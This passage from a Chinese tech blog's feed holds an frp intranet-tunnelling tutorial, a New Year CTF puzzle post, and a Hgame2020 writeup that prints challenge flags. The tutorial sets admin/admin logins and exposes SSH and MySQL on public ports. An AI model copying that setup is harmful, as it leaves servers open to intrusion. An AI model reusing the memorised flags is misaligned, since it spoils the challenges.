页面下载最新版本的程序。</p><p>目前最新的版本是 <code>v0.31.1</code></p><p>比如Windows64位下载 <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_windows_amd64.zip" target="_blank" rel="noopener">frp_0.31.1_windows_amd64.zip</a>，</p><p>Linux64位一般是这个 <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz" target="_blank" rel="noopener">frp_0.31.1_linux_amd64.tar.gz</a>。</p><p>其他系统/架构的对应下载就好了。</p><p><img src="/2020/01/29/Server_frp/download.png" alt="下载对应的文件"></p><p>将 <strong>frps</strong> 及 <strong>frps.ini</strong> 放到具有公网 IP 的机器上。</p><p>将 <strong>frpc</strong> 及 <strong>frpc.ini</strong> 放到处于内网环境的机器上。</p><h3 id="服务器端的搭建"><a href="#服务器端的搭建" class="headerlink" title="服务器端的搭建"></a>服务器端的搭建</h3><p>可以在服务器上可以用wget下载。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> -p /etc/frp<span class="token function">cd</span> /etc/frp<span class="token function">sudo</span> <span class="token function">wget</span> <span class="token string">"https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz"</span><span class="token function">sudo</span> <span class="token function">tar</span> xzvf frp_0.31.1_linux_amd64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> frp_0.31.1_linux_amd64/* /etc/frp</code></pre><p>然而国内下载速度感人，大概8M的文件就几KB/s…</p><p>于是还不如直接搭个梯子到外面下载好了再传到服务器上。</p><p>服务器端server嘛，当然用的是 <strong>frps</strong> 及 <strong>frps.ini</strong>。</p><p>完整版的 <code>frps_full.ini</code>里面有很详细的注释，也可以用来参考。</p><br><p>最简单的<strong>配置</strong>就直接这样写</p><pre class=" language-ini"><code class="language-ini"># frps.ini<span class="token selector">[common]</span><span class="token constant">bind_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span></code></pre><p>然后<strong>启动<code>frps</code></strong>（Linux下）</p><pre class=" language-bash"><code class="language-bash">/etc/frp/frps -c /etc/frp/frps.ini</code></pre><p>再去把系统的<strong>防.火|墙打开</strong>，以及阿里云等平台的<strong>安全组规则设好允许入站出站</strong>。</p><blockquote><p>这个firewall搞死我了emmm折腾了老半天最后发现没放行端口……</p><p>后面再写一篇关于firewall配置的。</p></blockquote><p>好了，下面到客户端。</p><hr><h3 id="客户端（内网主机）的搭建"><a href="#客户端（内网主机）的搭建" class="headerlink" title="客户端（内网主机）的搭建"></a>客户端（内网主机）的搭建</h3><p>同理把<code>frp</code>解压的文件放到<code>/etc/frp</code>文件夹下。</p><p>客户端client，用的是 <strong>frpc</strong> 及 <strong>frpc.ini</strong>。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[common]</span><span class="token constant">server_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> x.x.x.x</span><span class="token constant">server_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span><span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7001</span><span class="token selector">[Mysql]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1   #也可以是局域网中的内网IP</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 3306</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7002</span></code></pre><p>其中common里的<code>server_addr</code>是公网主机的公网IP，<code>server_port</code>设成与服务端一样的端口。</p><p>每个方框<code>[.+]</code>里的是name，下面都对应着一个规则，要求不能重名。</p><p><code>type</code>可以是tcp/udp/http/https/stcp/xtcp（具体看官方文档），一般就tcp/http啦。</p><p><code>local_ip</code>和<code>local_port</code>为本地地址及端口。</p><p><code>remote_port</code>为公网的端口，这个可以在服务端进行限制，注意<strong>要在服务端放行这些端口</strong>啊！</p><br><p>客户端可以在多个主机上运行，只要name不重名就行。</p><p>而后<strong>启动客户端</strong></p><pre class=" language-bash"><code class="language-bash">/etc/frp/frpc -c /etc/frp/frpc.ini</code></pre><p>Windows下：</p><pre class=" language-bash"><code class="language-bash">frpc.exe -c frpc.ini</code></pre><p><img src="/2020/01/29/Server_frp/client.png" alt="client"></p><p><code>start proxy success</code>表示启动成功。</p><hr><h3 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h3><p>现在就可以直接通过公网IP的7001端口访问内网的ssh，通过7002端口访问内网的Mysql啦！</p><p><strong>远程编程，访问网页，管理数据库</strong>什么的都可以实现啦！</p><p><strong>好棒呀！</strong></p><br><hr><hr><br><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h3><p><code>frp</code>的<strong>服务器端</strong>提供了一个在web端<strong>查看运行状态</strong>的展示界面。</p><p>配置如下，在<code>common</code>中添加如下信息：</p><pre class=" language-ini"><code class="language-ini"># frps.ini<span class="token selector">[common]</span><span class="token constant">dashboard_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7500 # 注意开放端口</span># dashboard 用户名密码，默认都为 admin<span class="token constant">dashboard_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">dashboard_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>而后重启服务端，就可以在<code>http://[server_addr]:7500</code> 访问 dashboard 界面，用户名密码默认为 <code>admin</code>。</p><p><img src="/2020/01/29/Server_frp/Dashboard_Overview.png" alt="Dashboard_Overview"></p><p><img src="/2020/01/29/Server_frp/Dashboard_Proxies.png" alt="Dashboard_Proxies"></p><p>还别说，挺好看的唉！</p><p>看了一下，基于<code>vue</code>写的。</p><hr><h3 id="Admin-UI"><a href="#Admin-UI" class="headerlink" title="Admin UI"></a>Admin UI</h3><p>在客户端也提供了一个类似于dashboard的查看状态和管理配置的界面。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[common]</span><span class="token constant">admin_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">admin_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7400</span><span class="token constant">admin_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">admin_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>然后本地就可以通过 <a href="http://127.0.0.1:7400" target="_blank" rel="noopener">http://127.0.0.1:7400</a> 来访问<strong>查看状态</strong>和<strong>修改配置</strong>了。</p><p>这里如果想通过内网IP（如<code>192.168.1.66</code>）查看的话，需要把<code>admin_addr</code>修改为 <code>0.0.0.0</code>（允许所有访问），或者对应的本地IP（如<code>192.168.1.66</code>）。</p><p>同时也需要在本地的firewall打开这个端口，否则在内网的其他主机也无法访问。（折腾了老半天才发现emmm</p><p>当然，想要在公网访问的话，把7400端口映射到外网就好了，不过安全起见算了吧。</p><p><img src="/2020/01/29/Server_frp/AdminUI.png" alt="AdminUI"></p><hr><h3 id="开启加密、压缩"><a href="#开启加密、压缩" class="headerlink" title="开启加密、压缩"></a>开启加密、压缩</h3><p>在客户端加入<code>use_encryption</code> 和 <code>use_compression</code>这两个参数。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 6000</span><span class="token constant">use_encryption</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span><span class="token constant">use_compression</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span></code></pre><hr><h3 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h3><p>这次直接把<code>frp</code>作为一个service好了，用<code>systemd</code>好了！</p><h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><p>新建一个文件，名叫 <code>frps.service</code>，写入</p><pre class=" language-ini"><code class="language-ini"># frps.service<span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Server</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frps -c /etc/frp/frps.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frps</span>#启动失败1分钟后再次启动<span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span>#重启控制：总是重启<span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><p><code>frpc.service</code></p><pre class=" language-ini"><code class="language-ini"># frpc.service<span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Client</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frpc -c /etc/frp/frpc.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frpc</span>#启动失败1分钟后再次启动<span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span>#重启控制：总是重启<span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><p>而后将此文件放到 服务器端和客户端的<strong><code>/etc/systemd/system/</code> 目录</strong>下。</p><p>先<code>killall frps</code>（或frpc），再调用</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> frps.service</code></pre><p>或</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> frpc.service</code></pre><p>这样就成功配置了开机自启。</p><p>而且可以通过下列命令进行管理：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start frpc.service    <span class="token comment" spellcheck="true"># 启动</span><span class="token function">sudo</span> systemctl stop frpc.service     <span class="token comment" spellcheck="true"># 停止</span><span class="token function">sudo</span> systemctl restart frpc.service  <span class="token comment" spellcheck="true"># 重启</span><span class="token function">sudo</span> systemctl status frpc.service   <span class="token comment" spellcheck="true"># 查看状态</span></code></pre><p>frps同理。</p><p><img src="/2020/01/29/Server_frp/service.png" alt="查看状态"></p><br><hr><hr><br><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>frp很强大的呢！</p><p>比如还可以在一定情况下绕过服务器实现点对点P2P连接，不过前提是内网和你的设备两端都要装frpc客户端。</p><p>更多且看<strong>官方文档</strong>：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><p>关键这个<strong>配置起来贼方便啊</strong>！</p><p>于是这样就可以通过公网IP，访问到你内网的资源啦，嘻嘻嘻~</p><p>好了，完事！</p><p>溜了溜了。</p><hr><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>官方仓库及介绍 <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></li><li>官方中文文档 <a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/fatedier/frp/blob/master/README_zh.md</a></li><li><a href="https://www.iplaysoft.com/frp.html" target="_blank" rel="noopener">https://www.iplaysoft.com/frp.html</a></li><li>Frp后台自动启动的几个方法 <a href="https://blog.csdn.net/x7418520/article/details/81077652" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81077652</a></li><li>Systemd 服务管理教程 <a href="https://cloud.tencent.com/developer/article/1516125" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516125</a></li><li><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">小想法 | 基于VSCode和ssh实现远程编程/炼丹</a></li></ol><p>还看到过一个免费的内网穿透服务，Sakura Frp <a href="https://www.natfrp.com/" target="_blank" rel="noopener">https://www.natfrp.com/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Server </tag>
            
            <tag> 穿透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020鼠年快乐！来玩红包闯关吧！</title>
      <link href="/2020/01/25/CTF_2020HappyChineseNewYear/"/>
      <url>/2020/01/25/CTF_2020HappyChineseNewYear/</url>
      
        <content type="html"><![CDATA[<h2 id="鼠年快乐"><a href="#鼠年快乐" class="headerlink" title="鼠年快乐"></a>鼠年快乐</h2><p>又是一年春来到，鼠年的钟声敲响了！</p><p><strong>鼠你健康，鼠你平安，鼠你快乐喵~</strong></p><p>这一年过的太难了，还要感谢大家的陪伴哈！</p><p>最近新型冠状病毒感染的肺炎来了，公共场所都关闭了emmm</p><p><strong>武汉加油！中国加油！</strong></p><p><strong>过年了，大家都要健康快乐呀！</strong></p><br><hr><br><h2 id="红包闯关"><a href="#红包闯关" class="headerlink" title="红包闯关"></a>红包闯关</h2><p>说到这个红包闯关，最开始是听说有学长的红包闯关，FJJ 学长也弄过一个，元旦的时候白师傅扔了个RSA的密码红包，Milkice 的年终总结里也出了道红包题。</p><p>反正就挺有意思的嘛23333</p><p>我的话其实元旦的时候就想弄了。</p><p>不过那时候一堆考试，去年12.31下午六点多才考完高频，后面又要考DSP，根本没空出题……</p><p>所以，不如趁着春节出道题玩玩呀！</p><br><hr><br><h2 id="题目来了"><a href="#题目来了" class="headerlink" title="题目来了"></a>题目来了</h2><p>就出个 <strong>Misc</strong> 的题吧，花了一番心思，做题看脑洞吧，可以好好玩玩！</p><p>社会主义核心价值观深入人心，那我们就从这开始吧！</p><pre><code>自由诚信自由自由文明和谐文明自由爱国自由敬业和谐自由自由自由平等自由自由爱国自由敬业平等爱国平等和谐和谐公正和谐和谐自由友善公正自由友善自由自由友善法治自由公正平等爱国平等爱国自由敬业和谐和谐和谐和谐自由友善敬业平等富强自由平等平等爱国自由爱国平等民主和谐公正自由友善公正和谐文明自由公正和谐平等自由友善自由平等自由自由法治平等民主和谐和谐平等和谐自由敬业平等公正和谐文明自由自由自由诚信民主自由诚信文明和谐和谐自由平等自由友善敬业自由诚信自由平等自由自由法治平等民主和谐自由自由友善公正自由友善法治自由友善法治平等公正和谐和谐平等法治平等法治平等敬业自由诚信文明自由诚信和谐自由诚信自由自由友善自由平等法治自由法治平等法治平等友善自由平等自由自由平等自由友善爱国平等友善自由平等爱国平等爱国自由法治自由友善公正和谐和谐平等自由自由友善法治平等友善自由平等公正自由法治自由敬业和谐文明自由诚信文明平等富强自由法治自由诚信富强平等敬业平等自由自由法治和谐自由平等自由自由诚信文明自由诚信自由平等文明平等自由自由法治自由和谐和谐和谐平等自由自由法治自由诚信和谐平等文明平等法治自由自由平等法治和谐文明和谐和谐自由友善平等自由诚信和谐平等诚信富强平等法治自由法治平等法治平等诚信富强自由友善公正自由友善平等自由友善法治平等友善自由平等法治自由自由平等法治平等友善自由和谐和谐自由法治自由法治自由诚信和谐平等爱国平等平等自由和谐自由诚信和谐自由诚信文明平等自由自由法治自由文明自由自由自由自由自由敬业和谐文明和谐和谐自由公正自由法治自由敬业平等诚信富强平等自由自由法治自由友善法治平等友善自由平等自由自由公正和谐平等自由法治平等法治平等和谐平等敬业自由友善公正平等富强自由公正平等友善自由平等平等自由爱国自由敬业和谐和谐自由诚信文明自由友善法治</code></pre><p>总共有<strong>4个Flag</strong>，对应着4个Alipay红包。</p><p><strong>形式都是 <code>MIAO{.+}</code></strong>，可能是<strong>纯数字</strong>或<strong>纯汉字</strong>。</p><p>如果红包过期了，1月31日前直接私戳把flag发给我就好了喵！</p><p>后面再发出题记录和WP。（咕咕咕</p><p><strong>注意解出来的flag不要随便发给别人啊！！！</strong></p><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><p>闯关需要一关一关过嘛，可能有点难度，给点小提示吧。</p><ol><li>套娃挺好玩的，比如这回一个文件里套了好几个，flag就越埋越深23333。</li><li>编码家族里，<code>base64</code>挺常用的，但别只想着它吧。哦对了，社会主义核心价值观也可以用来编码的呢。</li><li>喵喵偶尔会和小伙伴发邮件交流。</li><li>喵喵偶尔用<code>PhotoShop</code>修修图什么的，可能还会往图片里藏点什么有意思的东西，当然工具不只是PS。</li><li>十六进制编辑器在手，有可能哪天一不小心把文件改错了就打不开了或者说损坏了。</li><li>二维码是个好东西，能传递的信息不只是网址，还有……但是前提是你能找到它。</li><li>喵喵喜欢用<code>Python</code>来码代码，很多现成的库贼方便。而且编译后……</li><li>中文的话有可能需要借助<code>Unicode</code>编码。</li><li>一步步深入还会有进一步的提示，备注是个好东西。</li><li>（我也不记得了，自己想吧2333</li></ol><h3 id="Just-have-fun！"><a href="#Just-have-fun！" class="headerlink" title="Just have fun！"></a><strong><em>Just have fun！</em></strong></h3><p><strong>有问题欢迎留言，或者私戳呀！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Life </tag>
            
            <tag> 红包闯关 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Hgame2020 Week1 WriteUp</title>
      <link href="/2020/01/23/CTF_Hgame2020/"/>
      <url>/2020/01/23/CTF_Hgame2020/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天玩了玩杭州电子科技大学的<strong>Hgame2020</strong>，还别说，有点意思2333。</p><p><strong>平台网址：</strong></p><p><a href="https://hgame.vidar.club/" target="_blank" rel="noopener">https://hgame.vidar.club/</a></p><p>Flag格式：<code>hgame{.+}</code> </p><br><p><strong>20200125 更新：</strong></p><p>官方WP地址：<a href="https://github.com/vidar-team/Hgame2020_writeup" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup</a></p><hr><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>base64解码得到</p><p><code>.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></p><p>一看就是摩斯电码，加入分隔符后解码得到flag</p><p><code>W3LC0ME_TO_2020_HGAM3</code></p><blockquote><p>在线解密摩斯密码 <a href="http://www.atool9.com/morse.php" target="_blank" rel="noopener">www.atool9.com/morse.php</a></p></blockquote><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>解压得到图片<code>Pixiv@純白可憐.jpg</code>，foremost提取得到一个zip压缩文件。备注提示 <code>Password is picture ID.</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper.png" alt="misc_wallpaper"></p><p>本来还以为是在图片的文件里，而且还找到了一个id属性，然而并不是。</p><p>上网查了一下<code>純白可憐</code>，发现是P站画家，看了一篇介绍原来每张图片有个编号来着。</p><p>试了试百度搜图，出来的画风有点不对劲emmm。干脆直接上P站搜，然后在页面上找到了这张图。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper2.png" alt="misc_wallpaper2"></p><p>（还别说，挺好看的哇，还是个中国画师喵。</p><p><strong>天意</strong> <a href="https://www.pixiv.net/artworks/76953815" target="_blank" rel="noopener">https://www.pixiv.net/artworks/76953815</a></p><p>得到ID <code>76953815</code>，作为密码解压<code>flag.txt</code>（这么短还全数字，其实可以暴力破解的），得到</p><pre><code>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>Unicode啦，转ASCII（用的是<strong>NATIVE转ASCII</strong>来着）得到flag</p><p><code>hgame{Do_y0u_KnOW_uNiC0d3?}</code></p><hr><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>明文攻击得到了解密后的zip文件。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu.png" alt=""></p><p>得到加密的 <code>The Call of Cthulhu.doc</code>文件。根据 <code>Bacon.txt</code>文件提示寻找密码。</p><pre><code>of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.*Password in capital letters.</code></pre><p>然而不成功，不知道怎么做下去了嘤嘤嘤。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s<span class="token operator">=</span><span class="token string">'of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd'</span><span class="token operator">>></span><span class="token operator">></span> s1<span class="token operator">=</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> s <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token string">'A'</span> <span class="token operator">and</span> i<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> s1<span class="token punctuation">[</span><span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token string">'SCGEAORNGSHBECEAASRIFHGREOTEO'</span></code></pre><p><strong>20200125 更新：</strong></p><p>看了官方WP才知道<code>Bancon</code>指的是培根密码，我还以为是咸肉/熏猪肉来着。。</p><p>根据大小写转为a或b，比如小写为a，大写为b。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu2.png" alt="官方WP"></p><p>flag隐藏在最后emmm</p><p>Ctrl+D把隐藏取消掉就看到了。</p><p><code>hgame{Y0u_h@Ve_F0Und_mY_S3cReT}</code></p><hr><h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p><code>Password.txt</code>提示了</p><pre><code>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI</code></pre><blockquote><ul><li>Three fences first, Five Caesar next. English sentense first,  zip password next.</li></ul></blockquote><p>一开始还以为前面的是3个栅栏，后面的是5个凯撒，然后试了半天都不对。</p><p>突然一想应该是先栅栏再凯撒，一试果然。</p><p>先解密zip密码：栅栏得到<code>JFARZGFVMVRAJUIY</code>，凯撒得到密码 <code>EAVMUBAQHQMVEPDT</code>。解压得到 <code>OK.txt</code>。</p><p>同时上面的那句话同理解密得到</p><blockquote><p>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.</p></blockquote><p>emmm不大理解，不管了。</p><p>看文件是Ook!编码，解密得到base32编码。</p><pre><code>data:text;base32,NFLEET2SO4YEWR3HN5AUCQKBJZJVK2CFKVTUCQKBKFIUCQKBIVCUGQKZIFAUCRCPINCW6S2BIFAU6V2VNRCVCVSSGRXE6MTBKM3DIRKOO53UIMZPGB3DOV3ZINJVOOCHMNCTQ33LMJFXEQKPHBQSW3CBKNLC6MRTIFAUIKZVMM4WIQKBIRVWOQ2FIF3UCY2NIFIUCK2ZIFTUCOCBIZCECSKBKBDUCSKBMZGUCUKBJ5AUI2DHIFAUQN2ZJU2GKL3WNIXWINBQM5CTANJZOZHG2YLYLJQW6L2KMIYXGM3YJMYFIVRWK52G25LNMFYGMYKZF5GFUMKRHF3TMY2WLBQXC4DNOVLVO4KQPFLTSYSOHBJXIRJRMVWHEWTSOBWXCWBSNVIHSMTEKVIGGT3OIZLDE4LRLJZGY3DRNI4GY5SXPJTEK4SSJZMHAYJSME3FU4LMHFYGUODUNZLEIM2EOB4FMZDROFWWCNK2MFXS6STCGFZTG6CLGBKFMNSXORWXK3LBOBTGCWJPJRNDCUJZO43GGVSYMFYXA3LVK5LXCUDZK44WETRYKN2EKMLFNRZFU4TQNVYVQMTNKB4TEZCWJ5FU66BRNRXHON2OJRAXGVLVOR5HGTCJMJ3XMNLNFNVUE2SDFM3XC3LHPFCVKTLOGBUE2WKUGNSFKMCIKF4WQ2ZLNNFGSQ2PF5ZG2ZZWI5KU22RQNBRVCUJTORRTCSCRPFUGWT3LJRUVGRZYOIZHGNSHIVEWQMDYMNJVCM3IMYYTGULXNBCUW3KMPFJUOOCMGZ2TMV2BJFUFK6DGKNAXU2DGKYZVIR2XHBEXCULUGBIXAOCPPJLEU6BXKVRDGRCPKI4WI2LEJZDGMYKFKBUDEYLQMVGGC2TFGRNHSUDWONKHA33RG5AWYOKPNJJEY6DCKVRDGVCPKE4TS3LEJZDFQWKFF5YDAYKKMFFWC6TFGZNHSRDWON5HI4DROJAW4OKPNZIUYQSYLBRG4VCQKFHDK3TEHFFFKWKVF5XTANSGLJFXCN3EGZFDMQTWJUXXK4CLNZBW45CDNZITOTSVLBGHMUSQKFHDK3RZGFFFKNCVHFXVKK2ILJYW2NDEOFHDOQTWJEVXKNKPNVBW45CDNZ3TOTSVNZEHIUTWMNGTKSBRGJFDAMCWHFXVCK2ILJYWYNDUOFHDO2DOJEVSW6CPNVUXC43VNM4TC6TUKJDGGMTJNVZEMODEJQZVMTZSGMYTESRQGBLFM5BSNZHW2ZTRN5VGWMCVHFQXM2TQMM3HAKZQFN2TKT3NINYXM5KVGUYHUZDEIVRW22LOOJLDQZCMNZSE4MTOHEYUUVJUKZLDSNTOJ5WWE4DPIRZTEVJZMF3GU4DDGVYHKOBPOVYEW3SDOF3HIVJVGB4GITSJMRWXS5TSKY4F